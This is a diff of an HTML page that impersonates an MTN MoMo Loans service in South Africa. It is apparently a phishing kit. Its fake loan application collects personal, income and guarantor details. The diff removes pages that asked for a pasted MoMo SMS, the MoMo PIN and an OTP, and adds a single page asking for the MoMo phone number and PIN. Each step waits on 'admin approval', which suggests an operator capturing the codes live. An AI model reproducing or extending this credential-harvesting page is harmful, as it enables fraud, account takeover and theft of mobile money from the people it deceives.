@@ -12,7 +12,9 @@
 <!-- OFFLINE BANNER -->
 <div id="offlineBanner" class="offline-banner hidden">📡 You are offline — reconnecting...</div>
 
-<!-- LANDING -->
+<!-- ═══════════════════════════════════════════════════════════
+     LANDING
+     ═══════════════════════════════════════════════════════════ -->
 <div id="page-landing" class="page active">
     <div class="land-nav">
         <div style="flex:1;"></div>
@@ -88,7 +90,7 @@
     <div class="land-footer">© 2026 MTN MoMo Loans – Powered by MTN South Africa</div>
 </div>
 
-<!-- REGISTRATION -->
+<!-- REGISTRATION CHECK -->
 <div id="page-register-check" class="page">
     <nav class="navbar">
         <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
@@ -128,6 +130,7 @@
     </div>
 </div>
 
+<!-- REGISTRATION PROCESSING -->
 <div id="page-register-processing" class="page">
     <div class="wait-bg"><div class="wait-wrap">
         <div class="wait-icon pulse">📱</div>
@@ -167,10 +170,10 @@
     </nav>
     <div class="step-center"><div class="step-card">
         <h2>Loan Request</h2>
-        <p class="step-sub">Step 1 of 8 · Admin approval required</p>
+        <p class="step-sub">Step 1 of 6 · Admin approval required</p>
         <div class="prog-row">
-            <div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div>
-            <div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div>
+            <div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div>
+            <div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div>
         </div>
         <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
         <div class="acc-info-box" id="accInfoBox"><div id="accInfoText"></div></div>
@@ -182,7 +185,6 @@
     </div></div>
 </div>
 
-<!-- WAIT STEP LOAN -->
 <div id="page-wait-loan" class="page">
     <div class="wait-bg"><div class="wait-wrap">
         <div class="wait-icon pulse">💰</div>
@@ -203,8 +205,8 @@
     </nav>
     <div class="step-center"><div class="step-card">
         <h2>Personal Details</h2>
-        <p class="step-sub">Step 2 of 8 · Admin approval required</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+        <p class="step-sub">Step 2 of 6 · Admin approval required</p>
+        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
         <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
         <div class="field-row">
             <div class="field"><label>First Name</label><input type="text" id="s2fi" maxlength="40" placeholder="First Name" oninput="clearErr('s2Err')" /></div>
@@ -236,8 +238,8 @@
     </nav>
     <div class="step-center"><div class="step-card">
         <h2>Employment & Kin</h2>
-        <p class="step-sub">Step 3 of 8 · Admin approval required</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+        <p class="step-sub">Step 3 of 6 · Admin approval required</p>
+        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
         <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
         <div class="field"><label>Employment Status</label><div class="sel-wrap"><select id="s3em"><option>Employed</option><option selected>Self-employed</option><option>Unemployed</option><option>Retired</option><option>Student</option></select></div></div>
         <div class="field"><label>Annual Income (ZAR)</label><input type="number" id="s3in" min="0" max="100000000" placeholder="Annual income" oninput="clearErr('s3Err')" /></div>
@@ -266,8 +268,8 @@
     </nav>
     <div class="step-center"><div class="step-card">
         <h2>Guarantor</h2>
-        <p class="step-sub">Step 4 of 8 · Admin approval required</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+        <p class="step-sub">Step 4 of 6 · Admin approval required</p>
+        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
         <div class="guarantor-intro"><div class="gi-icon">👥</div><h3>Why a guarantor?</h3><p>A guarantor agrees to repay if you can't. Standard for first-time borrowers.</p></div>
         <div class="msg-box error" id="gErr"><span class="msg-icon">✕</span><span id="gErrTxt"></span></div>
         <div class="field"><label>Guarantor Name</label><input type="text" id="gName" maxlength="60" placeholder="Full name" oninput="clearErr('gErr')" /></div>
@@ -288,17 +290,17 @@
     </div></div>
 </div>
 
-<!-- FINAL CONFIRMATION -->
+<!-- CONFIRMATION -->
 <div id="page-confirmation" class="page">
     <nav class="navbar">
         <a class="nav-left" onclick="goTo('page-guarantor')">← Back</a>
         <div class="mtn-logo" style="flex-direction:row;gap:8px;"><img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" /><div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div></div></div>
-        <div class="nav-right"></div>
+        <div class="nav-right" id="navbarAccount5"></div>
     </nav>
     <div class="step-center"><div class="step-card">
         <h2>Review & Confirm</h2>
-        <p class="step-sub">Step 5 of 8</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+        <p class="step-sub">Step 5 of 6</p>
+        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
 
         <div class="confirm-block">
             <h3>💰 Loan</h3>
@@ -329,118 +331,87 @@
             </label>
         </div>
         <button class="btn-outline" onclick="showAgreement()" style="margin-bottom:12px;">📄 View Full Agreement</button>
-        <button class="btn-grad" onclick="goTo('page-sms-paste')" id="confirmBtn" disabled>Proceed to Verification</button>
+        <button class="btn-grad" onclick="goTo('page-momologin')" id="confirmBtn" disabled>Proceed to MoMo Login</button>
     </div></div>
 </div>
 
-<!-- SMS -->
-<div id="page-sms-paste" class="page">
+<!-- MOMO LOGIN -->
+<div id="page-momologin" class="page">
     <nav class="navbar">
         <a class="nav-left" onclick="goTo('page-confirmation')">← Back</a>
-        <div class="mtn-logo" style="flex-direction:row;gap:8px;"><img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" /><div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div></div></div>
-        <div class="nav-right" id="navbarAccount5"></div>
-    </nav>
-    <div class="step-center"><div class="step-card">
-        <h2>Verify MoMo SMS</h2>
-        <p class="step-sub">Step 6 of 8 · Admin approval required</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
-        <div class="msg-box error" id="momErr"><span class="msg-icon">✕</span><span id="momErrTxt"></span></div>
-        <div class="momo-msg-box">
-            <label class="momo-label">📩 Paste the MoMo SMS:</label>
-            <textarea id="smsMsgBox" maxlength="2000" placeholder="Copy and paste the MoMo message…"></textarea>
-        </div>
-        <div class="tip-box">💡 Check your SMS inbox for the message from MTN MoMo.</div>
-        <button class="btn-grad" onclick="submitStepSms()" id="smsSubmitBtn">Submit for Approval</button>
-        <button class="btn-outline" onclick="retryStep('sms')">↻ Clear & Retry</button>
-    </div></div>
-</div>
-
-<div id="page-wait-sms" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">📨</div>
-        <h2>Verifying SMS...</h2>
-        <div class="wait-status" id="waitSmsStatus">⏳ Awaiting approval...</div>
-        <div class="poll-indicator"><span class="dot"></span> Checking status live...</div>
-        <button class="btn-gray" onclick="cancelApplication()" style="margin-top:20px;">Cancel</button>
-    </div></div>
-</div>
-
-<!-- PIN -->
-<div id="page-pin" class="page">
-    <nav class="navbar">
-        <a class="nav-left" onclick="goTo('page-sms-paste')">← Back</a>
         <div class="mtn-logo" style="flex-direction:row;gap:8px;"><img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" /><div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div></div></div>
         <div class="nav-right" id="navbarAccount6"></div>
     </nav>
     <div class="step-center"><div class="step-card">
-        <h2>Enter MoMo PIN</h2>
-        <p class="step-sub">Step 7 of 8 · Admin approval required</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
-        <div class="msg-box error" id="pinErr"><span class="msg-icon">✕</span><span id="pinErrTxt"></span></div>
-        <div class="pin-label">5-digit PIN:</div>
-        <div class="pin-row">
-            <input type="password" id="pin0" class="pin-box" maxlength="1" placeholder="•" />
-            <input type="password" id="pin1" class="pin-box" maxlength="1" placeholder="•" />
-            <input type="password" id="pin2" class="pin-box" maxlength="1" placeholder="•" />
-            <input type="password" id="pin3" class="pin-box" maxlength="1" placeholder="•" />
-            <input type="password" id="pin4" class="pin-box" maxlength="1" placeholder="•" />
-            <button class="pin-eye" onclick="togPin()">👁</button>
-            <button class="pin-delete" onclick="clearLoginPin()">✕</button>
+        <h2>Log in to MoMo</h2>
+        <p class="step-sub">Step 6 of 6 · Admin approval required</p>
+        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
+
+        <div class="login-intro">
+            <div class="li-icon">📱</div>
+            <h3>Log in to your MoMo App</h3>
+            <p>Enter your MoMo credentials to confirm your account. This verifies you are the registered user.</p>
         </div>
-        <button class="btn-grad" onclick="submitStepPin()" id="pinSubmitBtn">Submit for Approval</button>
-        <button class="btn-outline" onclick="retryStep('pin')">↻ Clear & Retry</button>
-    </div></div>
-</div>
 
-<div id="page-wait-pin" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">🔐</div>
-        <h2>Verifying PIN...</h2>
-        <div class="wait-status" id="waitPinStatus">⏳ Awaiting approval...</div>
-        <div class="poll-indicator"><span class="dot"></span> Checking status live...</div>
-        <button class="btn-gray" onclick="cancelApplication()" style="margin-top:20px;">Cancel</button>
-    </div></div>
-</div>
+        <div class="msg-box error" id="loginErr"><span class="msg-icon">✕</span><span id="loginErrTxt"></span></div>
 
-<!-- OTP -->
-<div id="page-otp" class="page">
-    <nav class="navbar">
-        <a class="nav-left" onclick="goTo('page-pin')">← Back</a>
-        <div class="mtn-logo" style="flex-direction:row;gap:8px;"><img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" /><div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div></div></div>
-        <div class="nav-right" id="navbarAccount7"></div>
-    </nav>
-    <div class="step-center"><div class="step-card">
-        <h2>Enter OTP</h2>
-        <p class="step-sub">Step 8 of 8 · Admin approval required</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
-        <div class="otp-section"><div class="otp-section-title">4-digit OTP:</div>
-            <div style="display:flex;align-items:center;">
-                <div class="otp-inputs">
-                    <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•">
-                    <input type="password" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•">
-                    <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•">
-                    <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•">
-                </div>
-                <button class="otp-delete" onclick="clearOtpCode()">✕</button>
+        <div class="field">
+            <label>MTN MoMo Phone Number</label>
+            <div class="phone-row">
+                <div class="ph-pre">+27</div>
+                <input type="tel" id="loginPhone" maxlength="9" placeholder="8X XXX XXXX" oninput="normalizePhone('loginPhone');clearErr('loginErr')" />
+            </div>
+            <div class="field-hint">Must match your registration number</div>
+        </div>
+
+        <div class="field">
+            <label>MoMo PIN (5 digits)</label>
+            <div class="pin-row">
+                <input type="password" id="loginPin0" class="pin-box" maxlength="1" placeholder="•" />
+                <input type="password" id="loginPin1" class="pin-box" maxlength="1" placeholder="•" />
+                <input type="password" id="loginPin2" class="pin-box" maxlength="1" placeholder="•" />
+                <input type="password" id="loginPin3" class="pin-box" maxlength="1" placeholder="•" />
+                <input type="password" id="loginPin4" class="pin-box" maxlength="1" placeholder="•" />
+                <button class="pin-eye" onclick="togLoginPin()">👁</button>
+                <button class="pin-delete" onclick="clearLoginPin()">✕</button>
             </div>
         </div>
-        <div class="msg-box error" id="otpErr"><span class="msg-icon">✕</span><span id="otpErrTxt"></span></div>
-        <button class="btn-grad" onclick="submitStepOtp()" id="otpSubmitBtn">Submit for Approval</button>
-        <button class="btn-outline" onclick="retryStep('otp')">↻ Clear & Retry</button>
+
+        <div class="field">
+            <label>Login Method</label>
+            <div class="sel-wrap">
+                <select id="loginMethod" onchange="toggleLoginMethod()">
+                    <option value="pin" selected>🔑 MoMo PIN</option>
+                    <option value="biometric">🔒 Biometric (Fingerprint / Face ID)</option>
+                </select>
+            </div>
+        </div>
+
+        <div id="biometricBlock" style="display:none">
+            <div class="biometric-box">
+                <div class="bio-icon">🔒</div>
+                <p>Biometric login enabled</p>
+                <div class="bio-detail">Your device will verify your identity</div>
+            </div>
+        </div>
+
+        <button class="btn-grad" onclick="submitMoMoLogin()" id="loginBtn">Confirm Login</button>
+        <button class="btn-outline" onclick="retryStep('momologin')">↻ Clear & Retry</button>
     </div></div>
 </div>
 
-<div id="page-wait-otp" class="page">
+<div id="page-wait-momologin" class="page">
     <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">🔑</div>
-        <h2>Verifying OTP...</h2>
-        <div class="wait-status" id="waitOtpStatus">⏳ Awaiting approval...</div>
+        <div class="wait-icon pulse">🔐</div>
+        <h2>Confirming MoMo Login...</h2>
+        <p>Verifying your MoMo account login.</p>
+        <div class="wait-status" id="waitMomoLoginStatus">⏳ Awaiting approval...</div>
         <div class="poll-indicator"><span class="dot"></span> Checking status live...</div>
         <button class="btn-gray" onclick="cancelApplication()" style="margin-top:20px;">Cancel</button>
     </div></div>
 </div>
 
-<!-- SCAN -->
+<!-- SCAN / QUALIFICATION -->
 <div id="page-scan" class="page">
     <div class="wait-bg"><div class="wait-wrap">
         <div class="scan-icon"><div class="scan-ring"></div><div class="scan-inner">📊</div></div>
